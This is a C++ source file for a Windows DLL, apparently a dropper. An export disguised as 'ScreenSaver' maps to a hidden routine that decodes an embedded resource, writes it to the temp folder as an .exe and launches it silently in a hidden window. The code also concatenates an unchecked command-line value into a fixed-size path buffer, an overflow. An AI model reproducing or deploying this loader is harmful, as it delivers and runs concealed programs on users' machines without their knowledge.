// mso.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "ec.h"
#include "resource.h"
#include "shlwapi.h"
#include "shellapi.h"
#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"shell32.lib")
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}
inline HINSTANCE			GetCurrentModuleHandle(void)
{
	static HINSTANCE hCurrentModule = 0;
	if(NULL == hCurrentModule)
	{
		MEMORY_BASIC_INFORMATION m = { 0 };
		VirtualQuery(&hCurrentModule, &m, sizeof(MEMORY_BASIC_INFORMATION));
		hCurrentModule = (HINSTANCE) m.AllocationBase;
	}
	return hCurrentModule;
}
#pragma comment(linker, "/EXPORT:ScreenSaver=?_si0@@YGXPAUHWND__@@PAUHINSTANCE__@@PA_WH@Z,PRIVATE") 
 //__declspec(dllexport)
	 void CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
{	
	//OutputDebugStringA((LPCSTR)lpCmdLine);
	HINSTANCE hResHandle = GetCurrentModuleHandle();		
	HRSRC hRsrc = ::FindResourceW(hResHandle, MAKEINTRESOURCE(IDR_IFD1), L"IFD");
	if(hRsrc != NULL)
	{
		HGLOBAL hGlobal = ::LoadResource(hResHandle, hRsrc);
		if(hGlobal != NULL)
		{
			LPVOID pData = ::LockResource(hGlobal);
			if(pData != NULL)
			{
				DWORD dwSize = SizeofResource(hResHandle, hRsrc);
				char* pszData = new char[dwSize+1];
				pszData[dwSize] = '\0';					
				memcpy( pszData, pData, dwSize);
				dc(pszData, dwSize);
#ifndef _MAX_PATH				
#define  _MAX_PATH 260
#endif
				char szTempFile[_MAX_PATH] = {0};
				GetTempPathA(_MAX_PATH, szTempFile);
				PathAddBackslashA(szTempFile);
				char* pszFileName = NULL;
				if(lpCmdLine && lpCmdLine[0] !='\0')
				{
					pszFileName = (char*)lpCmdLine;

				}
				else
				{
					pszFileName = "ovxInstall_s";
				}
				//PathAppendA(szTempFile, pszFileName);
				//PathAppendA(szTempFile, ".exe");
				strcat(szTempFile, pszFileName);
				strcat(szTempFile, ".exe");
				HANDLE hFile =CreateFileA(szTempFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0 , NULL);
				if(INVALID_HANDLE_VALUE != hFile)
				{
					DWORD dwByteWritten = 0 ;
                    WriteFile(hFile, pszData, dwSize, &dwByteWritten, NULL);
					
					CloseHandle(hFile);
				}
				if(PathFileExistsA(szTempFile))
				{
					OutputDebugStringA(szTempFile);

					ShellExecuteA(NULL, NULL, szTempFile, "/S", "", SW_HIDE);
				}
                
				//<<"ReadResourceContents : "<<strContents.c_str()<<"\n";
				UnlockResource(hGlobal);
			}
		}
	}
	return ;
}


